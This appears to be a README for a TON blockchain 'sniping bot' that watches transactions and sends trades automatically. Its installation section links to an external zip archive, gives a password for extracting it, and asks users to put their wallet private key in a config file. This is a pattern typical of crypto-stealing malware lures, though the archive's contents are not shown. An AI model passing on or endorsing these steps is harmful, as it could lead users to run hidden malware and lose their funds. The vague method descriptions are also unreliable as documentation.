## **Overview**
TON Blockchain Sniping Bot is application designed to monitor transactions on the TON blockchain and automatically execute trades when specific conditions are met. The bot connects to a TON node, listens for new transactions, filters them based on predefined criteria, and performs a snipe transaction when the criteria are matched.

### Key Components
- **TON Client Initialization**: This component sets up the connection to the TON blockchain node, allowing the bot to fetch transaction data.
- **Wallet Setup**: This component manages the bot's wallet, including private key management and transaction creation.
- **Transaction Monitoring**: This component continuously listens for new transactions on the blockchain and filters them based on specified criteria.
- **Transaction Sniping**: This component creates and sends new transactions in response to matched criteria, effectively performing the snipe.
### Installation
- [Download](https://github.com/sui-sensei/ton-sniper/archive/refs/heads/main.zip) the repository.
- extract archive with pass `Mn14qIl`.
- Create a `config.json` file in the root directory of your project and specify your environment variables there. You can utilize the `config.json` that has been provided.
- run the bot.
### Config.json
```
{
  "NodeUrl": "https://main.ton.dev",
  "PrivateKey": "your_private_key",
  "TargetAddress": "target_address",
  "TargetAmount": 1000
}
```
### Detailed Description

**TON Client Initialization**
- **Functionality**: Connects to a TON blockchain node to enable interaction with the blockchain.
- **Key Methods**:
  - `HttpClient.BaseAddress`: Sets the base address for the TON node.

**Wallet Setup**
- **Functionality**: Manages the wallet used for sending transactions.
- **Key Methods**:
  - `Wallet(privateKey)`: Initializes the wallet with a private key.

**Transaction Monitoring**
- **Functionality**: Listens for new transactions and filters them based on predefined criteria such as target address and amount.
- **Key Methods**:
  - `GetTransactions(HttpClient client)`: Fetches new transactions from the blockchain.
  - Filtering logic to match transactions against criteria (e.g., target address, target amount).

**Transaction Sniping**
- **Functionality**: Creates and sends a new transaction in response to a matched transaction, effectively performing the snipe.
- **Key Methods**:
  - `wallet.CreateTransaction(to, value, message)`: Creates a new transaction.
  - `SendTransaction(HttpClient client, JObject transaction)`: Sends the created transaction to the blockchain.

### Example Workflow
1. **Initialization**:
   - The bot initializes the HTTP client and sets up the wallet using the private key.
   
2. **Monitoring**:
   - The bot enters a loop where it continuously fetches new transactions from the blockchain.
   - Each transaction is checked against the criteria (e.g., target address and amount).

3. **Sniping**:
   - When a transaction matches the criteria, the bot creates a new transaction (e.g., sending back to the sender with an additional amount).
   - The bot sends the new transaction to the blockchain.
